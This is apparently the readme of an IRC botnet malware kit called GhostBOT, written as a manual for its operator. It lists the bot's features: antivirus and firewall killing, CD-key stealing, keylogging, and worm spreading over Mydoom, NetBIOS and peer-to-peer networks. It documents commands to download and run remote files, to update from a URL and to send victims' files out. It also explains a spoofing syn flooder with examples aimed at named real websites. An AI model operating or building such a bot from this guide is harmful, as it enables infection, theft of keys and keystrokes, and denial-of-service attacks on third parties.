   ;-----------------------------------------------------------------------------------;
   ;                                                                                   ;
   ;      :;;,:   .,:                                .....         :,;;:     ......... ;
   ;   ifji;;jDt .t#:                      i:       .;#DitGD.   .fji,:;fEt  tLiif#fiiLi;
   ; .Dj      :.  tE   .      .      .    ;W         ,#;  ,#,  iW,      ,#f :   t#   . ;
   ; DK           Dt,iG#  .ji;tWt ii;iE  ;EDi,       jK;;tf,  ,#L        #G     DG     ;
   ;:#G    :;iii .#t. Gf  Kj   KL.Kft;:   W,  ,iiii  Ej..,EE  f#i       ;#i    .#i     ;
   ; EW.     fW  fL  .W: ;#:  :W:..:,fW  ;E   ..... ;#:   LW. ;#f      :Ei     tW.     ;
   ; .fEj,:,;Df :#.  jE;.:KL;;j. fG;;i,  LE;:      ,E#tiijj.   ;DLi::;tf:     ;KE;     ;
   ;    .:::               ..     ..                               :::                 ;
   ;                                                                                   ;
   ;-----------------------------------------------------------------------------------;
   ; Features:                                                                         ;
   ;          - SpyBot compatible commands,                                            ;
   ;          - AV/FW killer,                                                          ;
   ;          - CD-Key Stealer,                                                        ;
   ;          - Mydoom spreader,                                                       ;
   ;          - NetBIOS spreader,                                                      ;
   ;          - Encrypted strings in EXE,                                              ;
   ;          - Web-server (http://xxx.xxx.xxx.xxx:Port),                              ;
   ;          - API search engine by CRC32 (used only for important APIs),             ;
   ;          - KeyLogger (Keylog file can be download from webserver too),            ;
   ;          - P2P spreader (Kazaa, Edonkey, Morpheus, XoloX, ShareAza, LimeWire,     ;
   ;          - Prepend all .exe files in shared dirs if they are smaller than 5MB,    ;
   ;          - Support DCC SEND, DCC GET, DCC CHAT and topic commands.                ;
   ;                                                                                   ;
   ; --------------------------------------------------------------------------------- ;
   ; Compile:                                                                          ;
   ;          - Run make.bat to compile the source! (Tested with Delphi 6)             ;
   ; --------------------------------------------------------------------------------- ;
   ;          - \System                                                                ;
   ;                 System.dcu, sysinit.dcu and so on units replacement for Delphi 6  ;
   ;                 Allows to make program size smaller onto about 9,5K.              ;
   ;          - \ACLUnits                                                              ;
   ;                 SysUtils and Registry units replacement.                          ;
   ;          - \Resources                                                             ;
   ;                 Necessary Icon and INI files.                                     ;
   ;-----------------------------------------------------------------------------------;

   COMMANDS LIST: (Note: Only the "login" command is case sensitive)
   --------------

   login password                                  (example: login hello)
   logout
   delete [filename]                               (example: delete c:\windows\temp.exe)
   execute [filename]                              (example: delete c:\windows\temp.exe)
   rename [origenamfile] [newfile]                 (example: rename c:\windows\temp.exe c:\windows\driver.exe)
   makedir [dirname]               (example: makedir c:\test\)
   info                                            (info: gives some info)
   killprocess [processname]                       (example: killprocess mcafee.exe)
   disconnect [sec.]                               (info: disconnect the bot for x sec. if sec. is not given it disconnect the bot for 30mins.)
   quit                                            (info: bot quits running)
   download [url] [filename]                       (example: download http://127.0.0.1/server.exe c:\driver.exe) (info: Dot forget "http://" string in URL!)
   httpserver [Port] [root-dir]                    (example: httpserver 81 c:\)
   listprocesses                                   (info: lists all running proccesses)
   op
   get [filename]                  (example: get c:\command.com will trigger a dcc send on the remote pc)
   raw [raw command]                               (example: raw PRIVMSG #ghostbot :hello)
   threads                                         (info: will list al threads)
   list [path+filter]                              (example: list c:\*.*)
   cdkeys                                          (info: search CD-Keys on server's computer)
   restart                                         (info: restarts the server's computer)
   shutdown                                        (info: shuts down the server's computer)
   ipscan [StartIP] [port]                         (example: ipscan 1.1.1.1 3137)
   stopipscan                                      (info: stop IP scanner)
   uninstall                                       (info: remove BOT)
   startmydoom                                     (info: restart MyDoom spreader)
   stopmydoom                                      (info: stop MyDoom spreader)
   startavfwkiller                                 {info: restart AV/FW killer}
   stopavfwkiller                                  {info: stop AV/FW killer}
   starnetbios                                     {info: (re)start netbios spreader}
   stopnetbios                                     {info: stop netbios spreader}
   mirccmd                                         {example: mirccmd /msg #GhostBOT Hi!} {info: send message to victim's mIRC (if mIRC is open)
   redirect [input port] [host] [output port]  (example: redirect 100 eu.undernet.org 6667)

   clone [srv.] [port] [chan] [number of clones]   (example: clone 1.1.1.1 6667 #abc 4)
   rawclones [command]                             (example: rawclones PRIVMSG #ABCD :hello ; info: some servers do not allow more than 1 clone)
   killclones                                      (info: remove all clones)

   stopsyn                                         (info: stop syn flooder)

   update [URL]                                    (example: update http://www.nasa.gov\1.exe) (info: Dot forget "http://" string in URL!)

   Syn Flooder command
   -------------------

     syn [victim] [options]

     Options:
       -S:    Spoof host                         (0 is random (default))
       -p:    Separated list of dest ports       (0 is random (default))
       -s:    Separated list of src ports        (0 is random (default))
       -n:    Number of packets                  (0 is continuous (default))
       -d:    Delay (in ms)                      (default 0)

     Example I: syn www.kazaa.com -p 21,23,80,110

       On this attack:
         - Victim: www.kazaa.com
         - Source IP: Random
         - Destination ports: 21 + 23 + 80 + 110
         - Source ports: Random
         - Count: Continuous
         - Delay: 0 ms (no delay between packets)

     Example II: syn www.kazaa.org -S www.edonkey.com -p 21,80 -s 42,63 -n 1 -d 50

       On this attack:
         - Victim: www.kazaa.com
         - Source IP/host: www.edonkey.com
         - Destination ports: 21 + 80
         - Source ports: 42 + 63
         - Count: 1
             * Please note that 1 count will send the syn packets from every *
             * source port to every destination port. This means 4 packets   *
             * will be transmited with a 1 count on this attack.             *
         - Delay: 50 ms

   ;-----------------------------------------------------------------------------------;

   BOT SETTINGS:
   -------------

     - Settings.ini include the main settings for compiler.

     - .\Resources\ (All srings inside .\resources\*.str files will be encrypted after compile):
           TBOT.str - Main parameters of the BOT. You can freely change them.
           TP2PFILENAMES.str - File names of P2P spreader.
           TCDKEYS.str - parameters of CD-Key stealer ->   (1 KEY = 3 parameter)
                                                           1=SWAT3,           <- Software name
                                                           2=WON\CDKeys,      <- Registry key
                                                           3=SWAT3,           <- Registry value
                                                           ....
           TIRCSSERVERS.str - Here you can give unlimited number of IRC servers.
           TAUTHHOST.str - List of allowed host(s) at !login command.
